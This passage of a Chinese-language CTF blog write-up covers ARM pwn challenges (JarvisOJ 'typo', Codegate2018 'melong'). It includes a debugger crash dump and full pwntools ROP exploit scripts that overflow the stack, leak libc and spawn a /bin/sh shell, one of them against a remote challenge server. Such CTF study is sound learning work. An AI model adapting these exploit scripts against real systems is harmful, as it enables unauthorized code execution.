──────────────────────────────────────────────────<span class="o">[</span> REGISTERS <span class="o">]</span>──────────────────────────────────────────────────
 R0   0x0
 R1   0xfffef024 ◂— 0x61616161 <span class="o">(</span><span class="s1">&#39;aaaa&#39;</span><span class="o">)</span>
 R2   0x7e
 R3   0x0
 R4   0x62616162 <span class="o">(</span><span class="s1">&#39;baab&#39;</span><span class="o">)</span>
 R5   0x0
 R6   0x0
 R7   0x0
 R8   0x0
 R9   0xa5ec ◂— push   <span class="o">{</span>r3, r4, r5, r6, r7, r8, sb, lr<span class="o">}</span>
 R10  0xa68c ◂— push   <span class="o">{</span>r3, r4, r5, lr<span class="o">}</span>
 R11  0x62616163 <span class="o">(</span><span class="s1">&#39;caab&#39;</span><span class="o">)</span>
 R12  0x0
 SP   0xfffef098 ◂— 0x62616165 <span class="o">(</span><span class="s1">&#39;eaab&#39;</span><span class="o">)</span>
 PC   0x62616164 <span class="o">(</span><span class="s1">&#39;daab&#39;</span><span class="o">)</span>
───────────────────────────────────────────────────<span class="o">[</span> DISASM <span class="o">]</span>────────────────────────────────────────────────────
Invalid address 0x62616164










────────────────────────────────────────────────────<span class="o">[</span> STACK <span class="o">]</span>────────────────────────────────────────────────────
<span class="m">00</span>:0000│ sp  0xfffef098 ◂— 0x62616165 <span class="o">(</span><span class="s1">&#39;eaab&#39;</span><span class="o">)</span>
<span class="m">01</span>:0004│     0xfffef09c ◂— 0x62616166 <span class="o">(</span><span class="s1">&#39;faab&#39;</span><span class="o">)</span>
<span class="m">02</span>:0008│     0xfffef0a0 ◂— 0x62616167 <span class="o">(</span><span class="s1">&#39;gaab&#39;</span><span class="o">)</span>
<span class="m">03</span>:000c│     0xfffef0a4 ◂— 0x62616168 <span class="o">(</span><span class="s1">&#39;haab&#39;</span><span class="o">)</span>
<span class="m">04</span>:0010│     0xfffef0a8 ◂— 0x62616169 <span class="o">(</span><span class="s1">&#39;iaab&#39;</span><span class="o">)</span>
<span class="m">05</span>:0014│     0xfffef0ac ◂— 0x6261616a <span class="o">(</span><span class="s1">&#39;jaab&#39;</span><span class="o">)</span>
<span class="m">06</span>:0018│     0xfffef0b0 ◂— 0x6261616b <span class="o">(</span><span class="s1">&#39;kaab&#39;</span><span class="o">)</span>
<span class="m">07</span>:001c│     0xfffef0b4 ◂— 0x6261616c <span class="o">(</span><span class="s1">&#39;laab&#39;</span><span class="o">)</span>
Program received signal SIGSEGV
pwndbg&gt; cyclic -l 0x62616164
<span class="m">112</span></code></pre></td></tr></table>
</div>
</div>
<hr />

<p>或者可以直接爆破 padding 长度</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">pdb</span>
<span class="c1">#  context.log_level = &#34;debug&#34;</span>

<span class="c1">#  for i in range(100, 150)[::-1]:</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">112</span><span class="p">,</span> <span class="mi">113</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;l&#34;</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./typo&#34;</span><span class="p">,</span> <span class="n">timeout</span> <span class="o">=</span> <span class="mi">2</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;d&#34;</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&#34;qemu-arm&#34;</span><span class="p">,</span> <span class="s2">&#34;-g&#34;</span><span class="p">,</span> <span class="s2">&#34;1234&#34;</span><span class="p">,</span> <span class="s2">&#34;./typo&#34;</span><span class="p">])</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn2.jarvisoj.com&#34;</span><span class="p">,</span> <span class="mi">9888</span><span class="p">,</span> <span class="n">timeout</span> <span class="o">=</span> <span class="mi">2</span><span class="p">)</span>
    
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;quit</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
    
    <span class="s1">&#39;&#39;&#39;
</span><span class="s1">    jarvisOJ_typo [master●●] ROPgadget --binary ./typo --string /bin/sh
</span><span class="s1">    Strings information
</span><span class="s1">    ============================================================
</span><span class="s1">    0x0006c384 : /bin/sh
</span><span class="s1">    jarvisOJ_typo [master●●] ROPgadget --binary ./typo --only &#34;pop|ret&#34; | grep r0
</span><span class="s1">    0x00020904 : pop {r0, r4, pc}
</span><span class="s1">    &#39;&#39;&#39;</span>
    
    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x20904</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x6c384</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x110B4</span><span class="p">)</span>
    <span class="n">success</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

    <span class="c1">#  pause()</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="c1">#  pdb.set_trace()</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;echo aaaa&#34;</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;aaaa&#34;</span><span class="p">,</span> <span class="n">timeout</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span>
    <span class="k">except</span> <span class="ne">EOFError</span><span class="p">:</span>
        <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">continue</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></td></tr></table>
</div>
</div>
<h2 id="codegate2018-melong">Codegate2018 - melong</h2>

<p><a href="https://github.com/0x01f/pwn_repo/tree/master/Codegate2018_Melong">题目和脚本链接</a></p>

<h3 id="静态分析-1">静态分析</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">melong: ELF <span class="m">32</span>-bit LSB executable, ARM, EABI5 version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux.so.3, <span class="k">for</span> GNU/Linux <span class="m">3</span>.2.0, BuildID<span class="o">[</span>sha1<span class="o">]=</span>2c55e75a072020303e7c802d32a5b82432f329e9, not stripped
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/m4x/pwn_repo/Codegate2018_Melong/melong&#39;</span>
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE</code></pre></td></tr></table>
</div>
</div>
<h3 id="思路分析">思路分析</h3>

<p>程序逻辑很简单, 就不写分析过程了, 漏洞很好找, write_diary 中 read 的长度是由我们输入的, 可以栈溢出, 先进入 PT 函数, 输入 -1, 再进入 write_diary, 就可以实现 arbitrary overflow 了, 因此思路同 x64 下的 rop 相同, 先 leak 出 libc 基址, 然后控制执行 system(&ldquo;/bin/sh&rdquo;) 即可</p>

<p><strong>比赛时这道题目并没有给 libc 文件, 为了简化演示过程, 我直接用了我本地的 libc</strong></p>

<h3 id="exp">exp</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&#34;./melong&#34;</span>

<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;r&#34;</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;localhost&#34;</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>
<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;l&#34;</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&#34;qemu-arm&#34;</span><span class="p">,</span> <span class="s2">&#34;-L&#34;</span><span class="p">,</span> <span class="s2">&#34;/usr/arm-linux-gnueabi&#34;</span><span class="p">,</span> <span class="s2">&#34;./melong&#34;</span><span class="p">])</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&#34;qemu-arm&#34;</span><span class="p">,</span> <span class="s2">&#34;-g&#34;</span><span class="p">,</span> <span class="s2">&#34;1234&#34;</span><span class="p">,</span> <span class="s2">&#34;-L&#34;</span><span class="p">,</span> <span class="s2">&#34;/usr/arm-linux-gnueabi&#34;</span><span class="p">,</span> <span class="s2">&#34;./melong&#34;</span><span class="p">])</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./melong&#34;</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;/usr/arm-linux-gnueabi/lib/libc.so.6&#34;</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span>

<span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="n">height</span><span class="p">,</span> <span class="n">weight</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; : &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">height</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; : &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">weight</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">PT</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">write_diray</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;4&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;6&#34;</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
    <span class="n">check</span><span class="p">(</span><span class="mf">1.82</span><span class="p">,</span> <span class="mi">60</span><span class="p">)</span>
    <span class="n">PT</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="s1">&#39;&#39;&#39;
</span><span class="s1">    0x00011bbc : pop {r0, pc}
</span><span class="s1">    &#39;&#39;&#39;</span>
    <span class="n">pr0</span> <span class="o">=</span> <span class="mh">0x00011bbc</span>
    <span class="n">leak</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x54</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pr0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">])</span> <span class="o">*</span> <span class="mi">8</span>
    <span class="n">write_diray</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
    <span class="n">logout</span><span class="p">()</span>
    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\xf6</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:</span> <span class="p">])</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
    <span class="n">success</span><span class="p">(</span><span class="s2">&#34;libc.address -&gt; {:#x}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>

    <span class="n">check</span><span class="p">(</span><span class="mf">1.82</span><span class="p">,</span> <span class="mi">60</span><span class="p">)</span>
    <span class="n">PT</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">rop</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x54</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pr0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)))</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span>
    <span class="n">write_diray</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
    <span class="n">logout</span><span class="p">()</span>

    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></td></tr></table>
</div>
</div>
<h2 id="more-1">More</h2>

<ul>
<li>libc_datebase for arm?</li>
<li>如何多快好省的分析 strip 后的程序

<ul>
<li>后来了解到，对于静态编译的 bianry， 可以使用 lscan, flirt, rizzo, bindiff 等多种方法恢复部分符号表</li>
</ul></li>
<li>我的 melong 的 exp 是有问题的, 暂待解决</li>
</ul>

<h2 id="reference-1">Reference</h2>

<p><a href="https://elixir.bootlin.com/linux/v2.6.32.51/source/arch/arm/include/asm/unistd.h">https://elixir.bootlin.com/linux/v2.6.32.51/source/arch/arm/include/asm/unistd.h</a>
<a href="https://bbs.pediy.com/thread-224583.htm">https://bbs.pediy.com/thread-224583.htm</a>
<a href="https://courses.washington.edu/cp105/02_Exceptions/Calling%20Standard.html">https://courses.washington.edu/cp105/02_Exceptions/Calling%20Standard.html</a>
<a href="http://hideroot.tistory.com/46">http://hideroot.tistory.com/46</a>
<a href="http://www.freebuf.com/articles/terminal/134980.html">http://www.freebuf.com/articles/terminal/134980.html</a></p>

    </div>

    
    
<div class="post-copyright">
  <p class="copyright-item">
    <span class="item-title">Author</span>
    <span class="item-content">M4x</span>
  </p>
  <p class="copyright-item">
    <span class="item-title">LastMod</span>
    <span class="item-content">2018-07-31</span>
  </p>
  
  <p class="copyright-item">
    <span class="item-title">License</span>
    <span class="item-content"><a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">CC BY-NC-ND 4.0</a></span>
  </p>
</div>

    
    

    <footer class="post-footer">
      <div class="post-tags">
          <a href="https://bash-c.github.io/tags/arm/">arm</a>
          <a href="https://bash-c.github.io/tags/pwn/">pwn</a>
          
        </div>

      
      <nav class="post-nav">
        
          <a class="prev" href="/post/whitehat2018-pwn-writeup/">
            <i class="iconfont icon-left"></i>
            <span class="prev-text nav-default">WhiteHat2018 Pwn Writeup</span>
            <span class="prev-text nav-mobile">Prev</span>
          </a>
        
          <a class="next" href="/post/pin-in-ctf/">
            <span class="next-text nav-default">Reverse is Multiplex, You Need Pintools</span>
            <span class="prev-text nav-mobile">Next</span>
            <i class="iconfont icon-right"></i>
          </a>
      </nav>
    </footer>
  </article>

  
  

  
  

  

  

  

        </div>
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="social-links">
      <a href="mailto:I_am_M4x@protonmail.com" rel="me noopener" class="iconfont icon-email"
        title="email">
      </a>
      <a href="http://github.com/bash-c" rel="me noopener" class="iconfont icon-github"
        title="github" target="_blank">
      </a>
  <a href="https://bash-c.github.io/index.xml" rel="noopener alternate" type="application/rss&#43;xml" class="iconfont icon-rss"
    title="rss" target="_blank">
  </a>
  </div>

<div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - <a class="theme-link" href="https://github.com/xianmin/hugo-theme-jane">Jane</a>
  </span>

  <span class="copyright-year">
    &copy;
    
       -
    2018
    <span class="heart">
      <i class="iconfont icon-heart"></i>
    </span><span class="author">
        M4x
        
      </span></span>

  
  
    <span id="busuanzi_container">
      访客数/访问量：<span id="busuanzi_value_site_uv"></span>/<span id="busuanzi_value_site_pv"></span>
    </span>
  
</div>

    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont icon-up"></i>
    </div>
  </div>
  
<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
<script type="text/javascript" src="/dist/jane.min.js?v=2.7.0"></script>





  
    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
  




  <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>








</body>
</html>
